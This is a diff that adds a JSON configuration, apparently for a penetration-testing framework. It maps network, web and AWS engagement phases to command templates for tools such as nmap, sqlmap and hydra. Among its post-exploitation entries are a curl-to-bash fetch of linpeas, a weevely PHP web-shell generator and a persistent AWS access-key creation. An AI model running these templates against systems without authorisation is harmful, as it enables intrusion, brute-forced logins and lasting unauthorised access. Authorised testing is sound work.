@@ -1,0 +1,97 @@
+{
+  "external_network": {
+    "recon": [
+      {"tool": "whois", "command_template": "whois {{ target }}", "description": "Domain registration and ownership lookup", "install": "apt install whois"},
+      {"tool": "dig", "command_template": "dig {{ target }} ANY +noall +answer", "description": "DNS record enumeration", "install": "apt install dnsutils"},
+      {"tool": "theHarvester", "command_template": "theHarvester -d {{ target }} -b all -l 200", "description": "Email, subdomain, and name harvesting from public sources", "install": "apt install theharvester"},
+      {"tool": "subfinder", "command_template": "subfinder -d {{ target }} -silent", "description": "Passive subdomain discovery", "install": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"}
+    ],
+    "scanning": [
+      {"tool": "nmap", "command_template": "sudo nmap -sS -sV -O -A -p- --open -v {{ target }}", "description": "Full TCP SYN scan with service/OS detection", "install": "apt install nmap"},
+      {"tool": "masscan", "command_template": "sudo masscan {{ target }}/24 -p1-65535 --rate=1000 -oL masscan_results.txt", "description": "High-speed port scanner for initial discovery", "install": "apt install masscan"}
+    ],
+    "enumeration": [
+      {"tool": "gobuster", "command_template": "gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50", "description": "Web directory and file brute-forcing", "install": "apt install gobuster"},
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration", "install": "apt install enum4linux"},
+      {"tool": "ffuf", "command_template": "ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302", "description": "Fast web fuzzer for directories, parameters, and virtual hosts", "install": "go install github.com/ffuf/ffuf/v2@latest"}
+    ],
+    "exploitation": [
+      {"tool": "searchsploit", "command_template": "searchsploit {{ service_name }} {{ service_version }}", "description": "Search Exploit-DB for known exploits matching discovered services", "install": "apt install exploitdb"},
+      {"tool": "sqlmap", "command_template": "sqlmap -u '{{ target_url }}' --batch --level=3 --risk=2", "description": "Automated SQL injection detection and exploitation", "install": "apt install sqlmap"},
+      {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} {{ protocol }}", "description": "Brute-force login for network services", "install": "apt install hydra"}
+    ],
+    "post_exploitation": [
+      {"tool": "linpeas", "command_template": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash", "description": "Linux privilege escalation audit script", "install": "Download from GitHub releases"},
+      {"tool": "pspy", "command_template": "./pspy64 -i 1000", "description": "Monitor processes without root — catch cron jobs and scripts", "install": "Download from GitHub releases"}
+    ]
+  },
+  "internal_network": {
+    "recon": [
+      {"tool": "nmap", "command_template": "sudo nmap -sn {{ target }}/24 -v", "description": "Internal network host discovery", "install": "apt install nmap"},
+      {"tool": "netdiscover", "command_template": "sudo netdiscover -r {{ target }}/24 -P", "description": "ARP-based host discovery for internal networks", "install": "apt install netdiscover"}
+    ],
+    "scanning": [
+      {"tool": "nmap", "command_template": "sudo nmap -sS -sV -O -p- --open -v {{ target }}", "description": "Comprehensive internal port scan", "install": "apt install nmap"},
+      {"tool": "masscan", "command_template": "sudo masscan {{ target }}/24 -p1-65535 --rate=500 -oL internal_masscan.txt", "description": "Fast internal port scan", "install": "apt install masscan"}
+    ],
+    "enumeration": [
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration for Windows hosts", "install": "apt install enum4linux"},
+      {"tool": "smbclient", "command_template": "smbclient -L //{{ target }} -N", "description": "List SMB shares anonymously", "install": "apt install smbclient"},
+      {"tool": "rpcclient", "command_template": "rpcclient -U '' {{ target }}", "description": "RPC enumeration for Windows environments", "install": "apt install samba-common-bin"}
+    ],
+    "exploitation": [
+      {"tool": "searchsploit", "command_template": "searchsploit {{ service_name }} {{ service_version }}", "description": "Local exploit database search", "install": "apt install exploitdb"},
+      {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} smb", "description": "SMB credential brute force", "install": "apt install hydra"}
+    ],
+    "post_exploitation": [
+      {"tool": "linpeas", "command_template": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash", "description": "Linux privilege escalation enumeration", "install": "Download from GitHub releases"},
+      {"tool": "pspy", "command_template": "./pspy64 -i 1000", "description": "Process spy without root privileges", "install": "Download from GitHub releases"}
+    ]
+  },
+  "web_application": {
+    "recon": [
+      {"tool": "whatweb", "command_template": "whatweb {{ target }} -v", "description": "Web technology fingerprinting", "install": "apt install whatweb"},
+      {"tool": "wafw00f", "command_template": "wafw00f {{ target }}", "description": "Web Application Firewall detection", "install": "pip install wafw00f"}
+    ],
+    "scanning": [
+      {"tool": "nmap", "command_template": "nmap -sV -p 80,443,8080,8443 --script http-enum {{ target }}", "description": "Web-focused port scan with HTTP enumeration", "install": "apt install nmap"},
+      {"tool": "nikto", "command_template": "nikto -h {{ target }} -maxtime 300", "description": "Web server vulnerability scanner", "install": "apt install nikto"},
+      {"tool": "testssl", "command_template": "testssl.sh --severity HIGH {{ target }}:443", "description": "TLS/SSL configuration analysis", "install": "apt install testssl.sh"}
+    ],
+    "enumeration": [
+      {"tool": "gobuster", "command_template": "gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt", "description": "Web directory and file discovery", "install": "apt install gobuster"},
+      {"tool": "ffuf", "command_template": "ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403", "description": "Fast web fuzzer", "install": "go install github.com/ffuf/ffuf/v2@latest"},
+      {"tool": "wfuzz", "command_template": "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://{{ target }}/FUZZ", "description": "Web application fuzzer", "install": "apt install wfuzz"}
+    ],
+    "exploitation": [
+      {"tool": "sqlmap", "command_template": "sqlmap -u 'http://{{ target }}' --batch --crawl=3 --level=3 --risk=2", "description": "SQL injection testing and exploitation", "install": "apt install sqlmap"},
+      {"tool": "xsser", "command_template": "xsser --url 'http://{{ target }}' -a", "description": "XSS vulnerability scanner", "install": "apt install xsser"},
+      {"tool": "burpsuite", "command_template": "burpsuite", "description": "Manual web app testing via proxy (launch manually)", "install": "Download from PortSwigger"}
+    ],
+    "post_exploitation": [
+      {"tool": "weevely", "command_template": "weevely generate password /tmp/shell.php", "description": "PHP web shell generator and manager", "install": "apt install weevely"}
+    ]
+  },
+  "cloud_aws": {
+    "recon": [
+      {"tool": "aws", "command_template": "aws sts get-caller-identity --profile {{ aws_profile }}", "description": "Verify AWS credentials and account identity", "install": "apt install awscli"},
+      {"tool": "aws", "command_template": "aws iam get-account-summary --profile {{ aws_profile }}", "description": "Get IAM account-level summary", "install": "apt install awscli"}
+    ],
+    "scanning": [
+      {"tool": "aws", "command_template": "aws s3api list-buckets --profile {{ aws_profile }}", "description": "List all S3 buckets", "install": "apt install awscli"},
+      {"tool": "aws", "command_template": "aws ec2 describe-instances --profile {{ aws_profile }} --region {{ aws_region }}", "description": "Enumerate EC2 instances", "install": "apt install awscli"}
+    ],
+    "enumeration": [
+      {"tool": "aws", "command_template": "aws iam list-users --profile {{ aws_profile }}", "description": "List IAM users", "install": "apt install awscli"},
+      {"tool": "aws", "command_template": "aws iam list-roles --profile {{ aws_profile }}", "description": "List IAM roles", "install": "apt install awscli"},
+      {"tool": "aws", "command_template": "aws cloudtrail describe-trails --profile {{ aws_profile }}", "description": "Check CloudTrail logging configuration", "install": "apt install awscli"}
+    ],
+    "exploitation": [
+      {"tool": "aws", "command_template": "aws s3api get-bucket-acl --bucket {{ bucket_name }} --profile {{ aws_profile }}", "description": "Check S3 bucket ACL for public access", "install": "apt install awscli"},
+      {"tool": "aws", "command_template": "aws iam simulate-principal-policy --policy-source-arn {{ iam_arn }} --action-names '*' --profile {{ aws_profile }}", "description": "Simulate IAM policy permissions", "install": "apt install awscli"}
+    ],
+    "post_exploitation": [
+      {"tool": "aws", "command_template": "aws iam create-access-key --user-name {{ username }} --profile {{ aws_profile }}", "description": "Create persistent access key (authorized testing only)", "install": "apt install awscli"}
+    ]
+  }
+}
